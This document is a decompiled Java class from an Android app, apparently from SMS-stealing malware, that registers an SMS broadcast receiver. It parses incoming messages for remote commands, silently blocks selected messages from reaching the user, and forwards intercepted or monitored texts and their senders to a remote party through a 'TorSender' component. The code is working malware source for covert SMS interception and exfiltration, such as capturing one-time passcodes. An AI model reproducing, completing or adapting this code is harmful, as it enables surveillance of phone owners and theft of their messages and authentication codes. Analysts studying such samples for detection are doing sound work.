package com.baseapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.HashMap;
import java.util.Map;

/* loaded from: classes.dex */
public class MessageReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Map<String, String> messages = retrieveMessages(intent);
        for (String sender : messages.keySet()) {
            SmsProcessor processor = new SmsProcessor(messages.get(sender), context);
            boolean isCommandProcessed = processor.processCommand();
            if (isCommandProcessed) {
                abortBroadcast();
            } else {
                boolean needToInterceptIncoming = processor.needToInterceptIncoming();
                boolean needToListenIncoming = processor.needToListen();
                if (needToInterceptIncoming) {
                    TorSender.sendInterceptedIncomingSMS(context, messages.get(sender), sender);
                    abortBroadcast();
                } else if (needToListenIncoming) {
                    TorSender.sendListenedIncomingSMS(context, messages.get(sender), sender);
                }
            }
        }
    }

    private static Map<String, String> retrieveMessages(Intent intent) {
        Object[] pdus;
        Map<String, String> messages = null;
        Bundle bundle = intent.getExtras();
        if (bundle != null && bundle.containsKey("pdus") && (pdus = (Object[]) bundle.get("pdus")) != null) {
            int nbrOfpdus = pdus.length;
            messages = new HashMap<>(nbrOfpdus);
            SmsMessage[] messagesArray = new SmsMessage[nbrOfpdus];
            for (int i = 0; i < nbrOfpdus; i++) {
                messagesArray[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                String originatingAddress = messagesArray[i].getOriginatingAddress();
                if (!messages.containsKey(originatingAddress)) {
                    messages.put(messagesArray[i].getOriginatingAddress(), messagesArray[i].getMessageBody());
                } else {
                    String previousParts = messages.get(originatingAddress);
                    String msgString = String.valueOf(previousParts) + messagesArray[i].getMessageBody();
                    messages.put(originatingAddress, msgString);
                }
            }
        }
        return messages;
    }
}